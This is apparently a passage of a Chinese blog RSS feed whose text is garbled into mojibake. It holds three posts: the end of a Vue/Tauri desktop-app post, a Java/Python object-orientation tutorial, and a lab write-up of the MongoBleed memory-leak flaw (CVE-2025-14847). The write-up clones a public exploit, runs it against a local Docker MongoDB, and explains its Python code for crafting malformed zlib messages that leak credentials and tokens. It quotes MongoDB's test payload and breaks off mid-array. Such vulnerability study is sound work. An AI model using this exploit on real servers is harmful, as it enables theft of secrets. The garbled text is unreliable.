<p data-start="566" data-end="599">å¨å­¦æ ¡ç±äºæ°æ®ç»æè¿é¨è¯¾çé¾çè§£æ§ï¼æå°±æ³è½ä¸è½å®ç°ä¸ä¸ªæ¼ç¤ºå¨ç»æ¾å¥ä¼ç ä¸è®°å¾äºæèå¿äºéæ¶ç¹å»exeå°±å¯ä»¥æ¥çãæ¥éäºä¸äºèµææåéæ©äºVue 3 + TypeScript + Tauriçæ¶æï¼æåèµ°åºæ¥æ´ä¸ªæ°æ®ç»ææ ¸å¿å¨ç»æ8731kb</p>
<h1 data-start="566" data-end="599">é¡¹ç®éç¨äºå¦ä¸ææ¯æ ï¼</h1>
<ul data-start="601" data-end="899">
<li data-start="601" data-end="661">
<p data-start="603" data-end="661"><strong data-start="603" data-end="611">åç«¯æ¡æ¶</strong>ï¼Vue 3 + Composition API<br data-start="635" data-end="638">
ç¨ååºå¼æ°æ®é©±å¨å¨ç»ï¼é»è¾æ¸æ°ï¼ç¶æå¯æ§ã</p>

</li>
<li data-start="662" data-end="711">
<p data-start="664" data-end="711"><strong data-start="664" data-end="672">å¼åè¯­è¨</strong>ï¼TypeScript<br data-start="683" data-end="686">
å¼ºç±»åçº¦æè®©ç®æ³å®ç°æ´ä¸¥è°¨ï¼ä¹æ´éåæå­¦ç¤ºä¾ã</p>

</li>
<li data-start="712" data-end="803">
<p data-start="714" data-end="803"><strong data-start="714" data-end="722">æ¡é¢å°è£</strong>ï¼Tauri<br data-start="728" data-end="731">
æ ¸å¿éæ©ãç¸æ¯ Electronï¼Tauri åºäº Rust + ç³»ç»åç WebViewï¼ä½ç§¯å°ãå¯å¨å¿«ï¼çæç <code data-start="791" data-end="797">.exe</code> éå¸¸è½»éã</p>

</li>
<li data-start="804" data-end="847">
<p data-start="806" data-end="847"><strong data-start="806" data-end="815">å¾ç»ææ¸²æ</strong>ï¼vis-network<br data-start="827" data-end="830">
éåå¤çæ ãå¾ç­å¤æå³ç³»ç»æã</p>

</li>
<li data-start="848" data-end="899">
<p data-start="850" data-end="899"><strong data-start="850" data-end="860">UI ç»ä»¶åº</strong>ï¼Element Plus<br data-start="873" data-end="876">
ä¿è¯æ´ä½çé¢ç®æ´ãæç¨ï¼éä½æå­¦æä½ææ¬ã</p>

</li>
<li></li>

</ul>
<h1 data-start="906" data-end="926">ç®æ³ä¸å¨ç»å½»åºåç¦»</h1>
<p data-start="928" data-end="960">ä¼ ç»åæ³ä¸­ï¼æåºæéåç®æ³å¾å¾ç´æ¥æä½ DOM ææ ·å¼ï¼å¯¼è´é»è¾åè§å¾å¼ºè¦åï¼ä»£ç æ¢é¾è¯»ä¹é¾ç»´æ¤ã</p>
<p data-start="1013" data-end="1036">å¨ é¡¹ç®ä¸­ï¼æ´ä½æè·¯æ¯ï¼</p>
<ul data-start="1038" data-end="1081">
<li data-start="1038" data-end="1051">
<p data-start="1040" data-end="1051"><strong data-start="1040" data-end="1051">ç®æ³åªè´è´£è®¡ç®</strong></p>

</li>
<li data-start="1052" data-end="1065">
<p data-start="1054" data-end="1065"><strong data-start="1054" data-end="1065">å¨ç»åªè´è´£æ­æ¾</strong></p>

</li>
<li data-start="1066" data-end="1081">
<p data-start="1068" data-end="1081">ä¸¤èéè¿âå¨ç»å¸§âè¿è¡éä¿¡</p>

</li>

</ul>
<p data-start="1083" data-end="1095">ç®åæ¥è¯´ï¼æµç¨æ¯è¿æ ·çï¼</p>
<blockquote data-start="1097" data-end="1136">
<p data-start="1099" data-end="1136">ç®æ³å½æ°ï¼çº¯é»è¾ï¼ â çæå¨ç»å¸§åºå â æ­æ¾å¨éå¸§æ¸²æ â UI å±ç¤º</p>
<p><img src="https://img2024.cnblogs.com/blog/3058226/202601/3058226-20260103221017692-588293223.png" alt="image" loading="lazy"></p>
<p>&nbsp;</p>
<h1>&nbsp;Tauri</h1>
<p>ç®åè®²è§£ä¸ä¸è¿ä¸ª:</p>
<p>Electronæååºæ¥çç¨åºå¤ªå¤§,å®ä¼æ <strong data-path-to-node="10,0,0" data-index-in-node="42">æ´ä¸ª Chrome æµè§å¨</strong> å <strong data-path-to-node="10,0,0" data-index-in-node="58">æ´ä¸ª Node.js ç¯å¢</strong> é½å¡è¿ä½ ç <code data-path-to-node="10,0,0" data-index-in-node="78">.exe</code> éã</p>
<p>Tauri çåç«¯æ¯ç¨ Rust åçãRust ä¸éè¦æåä¸ä¸ªèææºï¼Runtimeï¼ãå®ä¼ç´æ¥è°ç¨ä½ çµèç³»ç»èªå¸¦çæµè§å¨åæ ¸ï¼Windows ä¸æ¯ Edge WebView2 ãwindow11,12é½å¯ãï¼ã</p>
<p><img src="https://img2024.cnblogs.com/blog/3058226/202601/3058226-20260103221557607-1387745295.png" alt="image" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/3058226/202601/3058226-20260103221646295-1529611106.png" alt="image" loading="lazy"></p>
<p>&nbsp;</p>
<p>&nbsp;æåçææçèµ·æ¥å¾ä¸éï¼ååºéåº¦å¾å¿«ï¼ åå­å¾å°ï¼å¯¹äºå°åé¡¹ç®è¿ä¸ªæ¹æ¡è¿æ¯å¾ä¸éçã</p>

</blockquote>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-03 22:20">2026-01-03 22:20</span>&nbsp;
<a href="https://www.cnblogs.com/LEMONIX">åå®¢101</a>&nbsp;
éè¯»(<span id="post_view_count">165</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19435059);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19435059', targetLink: 'https://www.cnblogs.com/LEMONIX/p/19435059', title: 'ä½¿ç¨Vue 3 + TypeScript + Tauriå®ç°ä¸ä¸ªå³æå³ç¨çè½»éçº§å¯æ§è¡ç¨åº' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ é¢åå¯¹è±¡ä¸å¤§ç¹ç¹(å°è£ãç»§æ¿ãå¤æ) ]]></title>
    <link>https://www.cnblogs.com/xi-yongqi/p/19434736</link>
    <guid>7012d0690ba12857f60e9a5aba839454</guid>
    <description>
    <![CDATA[ 
		<h1 class="postTitle">
			<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/xi-yongqi/p/19434736" title="åå¸äº 2026-01-03 19:08">
    <span role="heading" aria-level="2">é¢åå¯¹è±¡ä¸å¤§ç¹ç¹(å°è£ãç»§æ¿ãå¤æ)</span>
    

</a>

		</h1>
		<div class="clear"></div>
		<div class="postBody">
			<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p><strong>é¢åå¯¹è±¡ç¼ç¨æä¸å¤§ç¹æ§ï¼å°è£ãç»§æ¿ãå¤æã</strong></p>
<h4 id="å°è£">å°è£</h4>
<ol>
<li>å°è£æ¯æå°å¯¹è±¡çå±æ§ï¼æ°æ®ï¼å¦åéï¼åè¡ä¸ºï¼æä½æ°æ®çæ¹æ³ï¼å¦å½æ°ï¼æç»å¨ä¸èµ·ï¼åæ¶éèå¯¹è±¡åé¨çå®ç°ç»èã</li>
<li>æ ¸å¿ç®ç</li>
</ol>
<ul>
<li>æé«ä»£ç å®å¨æ§ï¼é²æ­¢å¤é¨ç¨åºéæç¯¡æ¹å¯¹è±¡çåé¨å±æ§ï¼é¿åæ ææ°æ®çäº§çã</li>
<li>æåä»£ç å¯ç»´æ¤æ§ï¼åé¨å®ç°ç»èçä¿®æ¹ä¸ä¼å½±åå¤é¨è°ç¨èï¼éä½ä»£ç è¦ååº¦ã</li>
<li>å¢å¼ºä»£ç å¤ç¨æ§ï¼å°è£åçç±»å¯ä»¥ä½ä¸ºç¬ç«æ¨¡åè¢«å¤æ¬¡å¼ç¨ã</li>
</ul>
<ol start="3">
<li>å·ä½å®ç°ï¼</li>
</ol>
<ul>
<li>ä½¿ç¨ private ä¿®é¥°æååé</li>
<li>æä¾ publicçgetter/setteræ¹æ³</li>
</ul>
<pre><code class="language-java">public class User {
    private String name;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}

</code></pre>
<hr>
<h4 id="ç»§æ¿">ç»§æ¿</h4>
<ol>
<li>ç»§æ¿ï¼å­ç±»(æ´¾çç±»)ç»§æ¿ç¶ç±»(åºç±»/è¶ç±»)çå±æ§åæ¹æ³ï¼å®ç°ä»£ç å¤ç¨ï¼å¹¶å»ºç« is-a å³ç³»ãå­ç±»æ ééæ°ç¼åç¶ç±»çå·²æä»£ç ï¼åæ¶è¿è½æ ¹æ®éæ±æ©å±èªèº«çç¬æå±æ§åæ¹æ³ï¼çè³éåç¶ç±»çæ¹æ³ã</li>
<li>æ ¸å¿ç®ç</li>
</ol>
<ul>
<li>æå¤§åä»£ç å¤ç¨ï¼åå°åä½ä»£ç ï¼æé«å¼åæçã</li>
<li>å»ºç«ç±»çå±æ¬¡å³ç³»ï¼æ¸æ°æ¢³çç±»ä¸ç±»ä¹é´çé»è¾å³èï¼å¦âå­¦çâæ¯âäººâçä¸ç§ï¼ã</li>
<li>ä¸ºå¤ææä¾åºç¡æ¯æã</li>
</ul>
<ol start="3">
<li>å·ä½å®ç°</li>
</ol>
<pre><code class="language-java">class Animal {
    void eat() {}
}

class Dog extends Animal {
    void bark() {}
}
</code></pre>
<ol start="4">
<li>æ³¨æäºé¡¹ï¼</li>
</ol>
<ul>
<li>Javaåªæ¯æåç»§æ¿ï¼Pythonæ¯æå¤ç»§æ¿ã</li>
<li>å¯ä»¥å¤å±ç»§æ¿</li>
<li>å¯ä»¥å®ç°å¤ä¸ªæ¥å£</li>
</ul>
<hr>
<h4 id="å¤æ">å¤æ</h4>
<ol>
<li>å¤æï¼åä¸ä¸ªæ¹æ³è°ç¨ï¼å¨ä¸åå¯¹è±¡ä¸è¡¨ç°åºä¸åçè¡ä¸ºã</li>
<li>å¤æåæ(javaä¸­)</li>
</ol>
<ul>
<li>æç»§æ¿ææ¥å£å³ç³»</li>
<li>æ¹æ³éå</li>
<li>ç¶ç±»å¼ç¨æåå­ç±»å¯¹è±¡</li>
</ul>
<ol start="3">
<li>ç®çï¼</li>
</ol>
<ul>
<li>æé«ä»£ç çµæ´»æ§ï¼éä½ä»£ç è¦ååº¦</li>
<li>å¢å¼ºä»£ç å¯æ©å±æ§ï¼å®ç¾å¥å âå¼é­ååâ</li>
<li>ç®åä»£ç ç»æï¼æé«ä»£ç å¯ç»´æ¤æ§</li>
</ul>
<ol start="4">
<li>ä»£ç ç¤ºä¾ï¼</li>
</ol>
<pre><code class="language-java">// 1. å­å¨ç»§æ¿å³ç³»ï¼ç¶ç±»Personï¼
class Person {
    // ç¶ç±»æ¹æ³ï¼éprivateãéstaticãéfinalï¼å¯è¢«éåï¼
    public void work() {
        System.out.println("æ®éäººçå·¥ä½");
    }
}

// å­ç±»Studentï¼ç»§æ¿Person
class Student extends Person {
    // 2. æ¹æ³éåï¼ä¸¥æ ¼éµå¾ªæ¹æ³ç­¾åä¸è´ï¼
    @Override
    public void work() {
        System.out.println("å­¦ççå·¥ä½ï¼ä¸è¯¾å­¦ä¹ ");
    }
}

// å­ç±»Teacherï¼ç»§æ¿Person
class Teacher extends Person {
    // 2. æ¹æ³éå
    @Override
    public void work() {
        System.out.println("èå¸çå·¥ä½ï¼å¤è¯¾æè¯¾");
    }
}

public class PolymorphismTest {
    public static void main(String[] args) {
        // 3. ç¶ç±»å¼ç¨æåå­ç±»å¯¹è±¡ï¼æ ¸å¿æ¡ä»¶ï¼
        Person p1 = new Student();
        Person p2 = new Teacher();
        
        // è§¦åå¤æï¼è°ç¨åä¸æ¹æ³ï¼åç°ä¸åè¡ä¸º
        p1.work(); // è¾åºï¼å­¦ççå·¥ä½ï¼ä¸è¯¾å­¦ä¹ 
        p2.work(); // è¾åºï¼èå¸çå·¥ä½ï¼å¤è¯¾æè¯¾
    }
}
</code></pre>
<ol start="5">
<li>javaä¸pythonå¤æåææ¡ä»¶çåºå«</li>
</ol>
<p><strong>äºèçå·®å¼æ ¹æºæ¯ Java ä¸ºéæå¼ºç±»åè¯­è¨ï¼çº¦æä¸¥æ ¼ï¼ï¼Python ä¸ºå¨æå¼±ç±»åè¯­è¨ï¼çº¦æå®½æ¾ï¼çµæ´»åº¦æ´é«ï¼ï¼å·ä½åææ¡ä»¶å¯¹æ¯å¦ä¸ï¼</strong></p>
<table>
<thead>
<tr>
<th>å¯¹æ¯ç»´åº¦</th>
<th>Java å¤æï¼å¿èï¼ç¼ºä¸ä¸å¯ï¼</th>
<th>Python å¤æï¼æ å¼ºå¶çº¦æï¼çµæ´»å®½æ¾ï¼</th>
</tr>
</thead>
<tbody>
<tr>
<td>ç»§æ¿/æ¥å£ä¾èµ</td>
<td>å¿é¡»å·å¤ç±»ç»§æ¿å³ç³»ææ¥å£å®ç°å³ç³»ï¼æ æ­¤å³ç³»æ æ³å®ç°å¤æ</td>
<td>æ éå¼ºå¶ä¾èµï¼â  æ¯æç»§æ¿ï¼å / å¤ç»§æ¿ï¼å®ç°å¤æï¼ä¸ Java ç±»ä¼¼ï¼ï¼â¡ æ ¸å¿æ¯æ<a href="https://www.cnblogs.com/xi-yongqi/p/19167194" target="_blank">é¸­å­ç±»å</a>ï¼æ ä»»ä½ç»§æ¿ / æ¥å£ï¼åªè¦å¯¹è±¡æ¥æç®æ æ¹æ³å³å¯å®ç°å¤æ</td>
</tr>
<tr>
<td>æ¹æ³éåè¦æ±</td>
<td>ä¸¥æ ¼éµå¾ªè§åï¼æ¹æ³åãåæ°åè¡¨ãè¿åå¼å¿é¡»ä¸è´ï¼ç¶ç±»æ¹æ³ä¸è½æ¯private/static/finalï¼æ¨èæ¾å¼æ æ³¨@Override</td>
<td>æ ä¸¥æ ¼è§åï¼ä»éå­ç±»ä¸ç¶ç±»æ¹æ³ååå³å¯è§ä¸º âéåâï¼å¯çµæ´»ä¿®æ¹åæ° / è¿åå¼ï¼æ å¼ºå¶@Overrideæ æ³¨</td>
</tr>
<tr>
<td>å¯¹è±¡å¼ç¨ç»å®</td>
<td>å¿é¡»æ»¡è¶³ç¶ç±»/æ¥å£å¼ç¨æåå­ç±»/å®ç°ç±»å¯¹è±¡ï¼éæç±»åå£°æä¸ºç¶ç±»ï¼å®éæåå­ç±»å®ä¾ï¼ï¼è¿æ¯è§¦åå¤æçå³é®</td>
<td>å®å¨ä¸éè¦ï¼Pythonåéæ åºå®ç±»åå£°æï¼æ éå»æç»å®ç¶ç±»å¼ç¨ï¼ç´æ¥ä½¿ç¨å­ç±»å®ä¾æç¬¦åæ¹æ³è¦æ±çå¯¹è±¡å³å¯è§¦åå¤æ</td>
</tr>
</tbody>
</table>

</div>
<div class="clear"></div>

		</div>
		<div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-03 19:09">2026-01-03 19:08</span>&nbsp;
<a href="https://www.cnblogs.com/xi-yongqi">æä¼æ¿é£å»</a>&nbsp;
éè¯»(<span id="post_view_count">64</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19434736);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19434736', targetLink: 'https://www.cnblogs.com/xi-yongqi/p/19434736', title: 'é¢åå¯¹è±¡ä¸å¤§ç¹ç¹(å°è£ãç»§æ¿ãå¤æ)' })">ä¸¾æ¥</a>
</div>
	 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ æ·±åº¦åæMangoBleed(CVE-2025-14847) ]]></title>
    <link>https://www.cnblogs.com/DSchenzi/p/19434377</link>
    <guid>cf48ed95b39651f1399a333f31e72f3f</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/DSchenzi/p/19434377" title="åå¸äº 2026-01-03 15:22">
    <span role="heading" aria-level="2">æ·±åº¦åæMangoBleed(CVE-2025-14847)</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="mangobleedcve-2025-14847">MangoBleed(CVE-2025-14847)</h1>
<p>æ¬æåæäºCVE-2025-14847æ¼æ´åçãæ¼æ´å¤ç°ä»¥åç»åäºHTBé¶åºçSherlockè¿è¡ç»¼ååææ¥å¿ã</p>
<h2 id="sherlock-scenario">Sherlock Scenario</h2>
<p>You were contacted early this morning to handle a highâpriority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.</p>
<p>You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.</p>
<h2 id="task1">Task1</h2>
<p>What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?</p>
<p>ç½ä¸æä¸ä¸ä¹å°±æ¯æè¿çåºæ¥ç</p>
<p><strong>CVE-2025-14847</strong></p>
<h3 id="æ¼æ´ç®ä»">æ¼æ´ç®ä»</h3>
<ul>
<li>
<p>ç±»åï¼æ è®¤è¯è¿ç¨å åå­æ³é²</p>
</li>
<li>
<p>å±å®³ï¼æ»å»èæ éè®¤è¯å³å¯ä»æå¡å¨åå­ä¸­æåæææ°æ®ï¼å¯è½åæ¬æ°æ®åºå­è¯ãAPIå¯é¥ãä¼è¯ä»¤çãç¨æ·æ°æ®ç­</p>
</li>
</ul>
<h3 id="æ¼æ´åç">æ¼æ´åç</h3>
<p>æ ¹æºå¨äºMongoDBçzlibç½ç»æ¶æ¯åç¼©å¤çé»è¾ï¼</p>
<ul>
<li>MongoDBæ¯æå®¢æ·ç«¯åéåç¼©æ¶æ¯ã</li>
<li>æ»å»èåéç¹è´¨ç¸å½¢çåç¼©åï¼å¨æ¶æ¯å¤´ä¸­ææå¶é é¿åº¦å­æ®µä¸ä¸è´</li>
<li>æå¡å¨å¨è§£åæ¶ä¼åéè¿å¤§ç¼å²åºï¼å¹¶éè¯¯å°å°æªåå§åå°å åå­ä½ä¸ºæææ°æ®è¿åç»æ»å»èã</li>
<li>æ­¤è¿ç¨å¤æ¬¡åéä¸ååç§»çç¸å½¢è¯·æ±ï¼æ»å»èå¯éæ­¥æååå­ç¢çï¼èååå¯è½æ¢å¤ææä¿¡æ¯ã</li>
<li>ä¸æ¯ç´æ¥RCEï¼ä½æ³é²çå­è¯å¯å¯¼è´åç»­æ¨ªåç§»å¨ææ°æ®çªåã</li>
</ul>
<h3 id="åå½±åçæ¬">åå½±åçæ¬</h3>
<p>å ä¹ææ2017å¹´ä»¥æ¥å¯ç¨zlibåç¼©çMongoDB Serverçæ¬ï¼åæ¬ä¸»æµåæ¯:</p>
<ul>
<li>8.xç³»åï¼è³8.2.2ï¼</li>
<li>7.0.xã6.0.xã5.0.xã4.4.xç­éççæ¬</li>
<li>å·ä½ï¼å½±å4.4ã5.0ã6.0ã7.0ã8.0å¨ç³»åï¼ç´å°2025å¹´11æçæ¬ï¼</li>
</ul>
<h3 id="ç¯å¢æ­å»º">ç¯å¢æ­å»º</h3>
<p>1.dockerç¯å¢</p>
<p>docker-compose.yml</p>
<pre><code class="language-yml">version: '3.8'

services:
  # åæ¼æ´å½±åççæ¬ï¼å¼å¯ Zlibï¼
  mongodb-vulnerable:
    image: mongo:6.0.14
    container_name: mongodb-vulnerable
    ports:
      - "27017:27017"
    command: mongod --networkMessageCompressors snappy,zlib

  # å·²ä¿®å¤ççæ¬ï¼ç¨äºå¯¹æ¯æµè¯ï¼
  mongodb-patched:
    image: mongo:6.0.27
    container_name: mongodb-patched
    ports:
      - "27018:27017"
    command: mongod --networkMessageCompressors snappy,zlib

volumes:
  mongodb-data:
  mongodb-patched-data:
</code></pre>
<p>æåéå</p>
<pre><code class="language-kotlin">docker-compose up -d
</code></pre>
<p>æåå¤±è´¥çå¯ä»¥ä½¿ç¨è¿ä¸ªä»åºçéåæºéç½®å·¥å·:</p>
<pre><code class="language-kotlin">git clone https://github.com/hzhsec/docker_proxy.git
chmod +x *.sh
./docker-proxy.sh
</code></pre>
<p>ç­éåæºæ¢å®ï¼åæå</p>
<pre><code>docker-compose up -d
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152112091-633231826.png" alt="image-20260101223837974" loading="lazy"></p>
<h3 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h3>
<pre><code class="language-kotlin">git clone https://github.com/cybertechajju/CVE-2025-14847_Expolit.git
cd CVE-2025-14847_Expolit
</code></pre>
<p>åå»ºèæç¯å¢</p>
<pre><code class="language-kotlin">python -m venv myenv
source myenv/bin/activate
</code></pre>
<p>å®è£ä¾èµå</p>
<pre><code class="language-kotlin">pip install -r requirements.txt
python mongobleed_pro.py -h
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152112673-1527423820.png" alt="image-20260101225522114" loading="lazy"></p>
<p>ä½¿ç¨æ¬å°ç27017æ¼æ´çæ¬æµè¯</p>
<pre><code>python mongobleed_pro.py --target http://localhost:27017
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113009-2057906935.png" alt="image-20260101230632647" loading="lazy"></p>
<p>æ³é²äºæ°æ®ï¼ä¿å­å¨æ¬å°ç<code>dump_localhost.bin</code>ï¼<code>loot_localhost.txt</code></p>
<p>åæ¶æµè¯ä¸ä¸<code>27018</code>ç«¯å£</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113400-1983221027.png" alt="image-20260101230957937" loading="lazy"></p>
<p>æ²¡ææ¼æ´</p>
<h3 id="æ¼æ´åæ">æ¼æ´åæ</h3>
<p>æä»¬ä»expä¸å»åæä¸ä¸</p>
<p>ç¬¬ä¸æ­¥ï¼</p>
<pre><code class="language-python">sock = socket.socket()
sock.settimeout(3)
sock.connect((host, port))  # å°è¯è¿æ¥MongoDBé»è®¤ç«¯å£27017
</code></pre>
<p>ç¬¬äºæ­¥ï¼</p>
<p><code>check_vulnerability()</code>æ¼æ´å­å¨æ§æ£æµ</p>
<pre><code class="language-python">def check_vulnerability(host, port):
    hacker_loading("Probing target defenses", 1)
    test_offsets = [100, 500, 1000, 1500, 2000, 3000]
    for offset in test_offsets:
        response = send_probe(host, port, offset, offset + 500)
        if extract_leaks(response):
            return True
    return False
</code></pre>
<p>éè¿ä¸åç"åç§»éï¼offsetï¼"åéè¯·æ±ï¼åªè¦è½ä»ååºä¸­æåå°éé¢ææ°æ®ï¼å°±å¤å®ç®æ æ¼æ´æªä¿®å¤ã</p>
<p>ç¬¬ä¸æ­¥ï¼</p>
<p><code>send_probe()</code>æé payload</p>
<pre><code class="language-python"># 1. æé ç¸å½¢çBSONææ¡£ï¼MongoDBçæ°æ®æ ¼å¼ï¼
content = b'\x10a\x00\x01\x00\x00\x00'
bson = struct.pack('&lt;i', doc_len) + content  # ä¼ªé ææ¡£é¿åº¦ï¼å³é®æ¼æ´è§¦åç¹ï¼

# 2. å°è£ä¸ºMongoDBçOP_MSGæ¶æ¯
op_msg = struct.pack('&lt;I', 0) + b'\x00' + bson

# 3. åç¼©æ¶æ¯ï¼è§¦åæ¼æ´çå³é®æä½ï¼
compressed = zlib.compress(op_msg)

# 4. æé æç»æ¶æè½½è·ï¼åå«åç¼©æ è¯+ç¸å½¢æ°æ®ï¼
payload = struct.pack('&lt;I', 2013) + struct.pack('&lt;i', buffer_size) + struct.pack('B', 2) + compressed

# 5. å ä¸MongoDBåè®®å¤´ï¼åéç»ç®æ 
header = struct.pack('&lt;IIII', 16 + len(payload), 1, 0, 2012)
sock.sendall(header + payload)
</code></pre>
<ol>
<li>ä¼ªé çBSONææ¡£é¿åº¦(doc_len)ä¸å®éåå®¹ä¸å¹é</li>
<li>å¯¹è¯·æ±è¿è¡zlibåç¼©åï¼MongoDBçè§£å/è§£æé»è¾å­å¨ç¼ºé·ï¼å¯¼è´åå­è¶çè¯»å</li>
<li>æ»å»èéè¿æ§å¶doc_lenåbuffer_sizeï¼ç¼å²åºå¤§å°ï¼ï¼ç²¾åæ§å¶åå­è¯»åçèå´</li>
</ol>
<p>ç¬¬åæ­¥ï¼</p>
<p>åéè¯·æ±å¹¶æ¥æ¶æ³é²æ°æ®ï¼send_probe()åç»­é»è¾ï¼</p>
<pre><code class="language-python">response = b''
while len(response) &lt; 4 or len(response) &lt; struct.unpack('&lt;I', response[:4])[0]:
    chunk = sock.recv(4096) #æç»­æ¥åååºï¼ç´å°å®æ´è¯»åï¼
    if not chunk: break
    response += chunk
</code></pre>
<p>è·åç®æ è¿åçãåå«åå­æ³æ¼æ°æ®çååºå</p>
<p>ç¬¬äºæ­¥ï¼</p>
<p>æåæ³é²çåå­æ°æ®å³ extract_leakså½æ°</p>
<p>æ¹éæå+ææä¿¡æ¯è¯å«<code>run_exploit()</code> + <code>analyze_secrets()</code></p>
<p>è¿æä¿å­æ»å»ç»æï¼æä¹ålootï¼</p>
<p>æ»å»æ»ç»ï¼</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113901-643757865.png" alt="image-20260102153604895" loading="lazy"></p>
<p>åå°æºç </p>
<p><a href="https://github.com/mongodb/mongo/blob/r8.0.16/src/mongo/transport/message_compressor_zlib.cpp" target="_blank" rel="noopener nofollow">https://github.com/mongodb/mongo/blob/r8.0.16/src/mongo/transport/message_compressor_zlib.cpp</a></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152114375-627847864.png" alt="image-20260102154747986" loading="lazy"></p>
<p>åæ¬ç¨äºè¿åè§£åæ°æ®å¤§å°çè¡ä½¿ç¨äº<code>return {output.length()};</code>è¿è¡ä»£ç ï¼å®åè¯ä»£ç è¿åå·²åéçåå­éï¼èä¸æ¯è§£åæ°æ®çå®éé¿åº¦ãæ°ç<code>return {length};</code>ç¡®ä¿åªè¿åè§£åç¼©æ°æ®çå®éé¿åº¦ã</p>
<p><a href="https://github.com/mongodb/mongo/blob/master/src/mongo/transport/message_compressor_zlib.cpp" target="_blank" rel="noopener nofollow">https://github.com/mongodb/mongo/blob/master/src/mongo/transport/message_compressor_zlib.cpp</a></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152114721-1137957807.png" alt="image-20260102155010199" loading="lazy"></p>
<p>è¿ä¸æ­¥åæå¯ä»¥åç°ï¼å¨æ°ç<code>src/mongo/transport/message_compressor_manager_test.cpp</code>ä¸­å¤äºä¸ä¸ªcheckUndersizeå½æ°</p>
<pre><code class="language-cpp">void checkUndersize(const Message&amp; compressedMsg,
                    std::unique_ptr&lt;MessageCompressorBase&gt; compressor) {
    MessageCompressorRegistry registry;
    const auto compressorName = compressor-&gt;getName();

    std::vector&lt;std::string&gt; compressorList = {compressorName};
    registry.setSupportedCompressors(std::move(compressorList));
    registry.registerImplementation(std::move(compressor));
    registry.finalizeSupportedCompressors().transitional_ignore();

    MessageCompressorManager mgr(&amp;registry);
    BSONObjBuilder negotiatorOut;
    std::vector&lt;StringData&gt; negotiator({compressorName});
    mgr.serverNegotiate(negotiator, &amp;negotiatorOut);
    checkNegotiationResult(negotiatorOut.done(), {compressorName});

    auto swm = mgr.decompressMessage(compressedMsg);
    ASSERT_EQ(ErrorCodes::BadValue, swm.getStatus());
}
</code></pre>
<p>æ ¸å¿é»è¾å¨</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115003-534946274.png" alt="image-20260102155616512" loading="lazy"></p>
<p><code>mgr.decompressMessage(compressedMsg)</code>:è°ç¨åç¼©å¨ç®¡çå¨è§£åä¼ å¥çâå¼å¸¸âçåç¼©æ¶æ¯</p>
<p><code>ASSERT_EQ(ErrorCodes::BadValue, swm.getStatus())</code>ï¼ååæµè¯æ­è¨</p>
<p>ä¸»è¦ç®çæ¯éªè¯å½ä¼ å¥ä¸ä¸ª âå°ºå¯¸å¼å¸¸ï¼undersizeï¼â çåç¼©æ¶æ¯æ¶ï¼æ¶æ¯è§£åé»è¾è½æ­£ç¡®è¿å <code>ErrorCodes::BadValue</code> éè¯¯ç </p>
<p>åæ¶å¨ä¸é¢ä¹ç»å°äºæµè¯ç¨ä¾</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115354-1662843965.png" alt="image-20260102155917477" loading="lazy"></p>
<p>éç¹çä¸ä¸Zlibçæµè¯ç¨ä¾</p>
<pre><code class="language-cpp">TEST(ZlibMessageCompressor, Undersize) {
    // 1. æé Zlibç®æ³çâå°ºå¯¸å¼å¸¸âäºè¿å¶æ¶æ¯æ°æ®
    std::vector&lt;std::uint8_t&gt; payload = {
        0x3c, 0x00, 0x00, 0x00, 0xad, 0xde, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdc, 0x07, 0x00,
        0x00, 0xdd, 0x07, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x02, 0x78, 0xda, 0x63, 0x60, 0x00,
        0x82, 0xdf, 0xf2, 0x0c, 0x0c, 0xac, 0xf1, 0x99, 0x29, 0x0c, 0x0c, 0x02, 0x40, 0x9e, 0x87,
        0xab, 0x63, 0x80, 0x8f, 0xab, 0xa3, 0x37, 0x03, 0x12, 0x00, 0x00, 0x6d, 0x26, 0x04, 0x97};

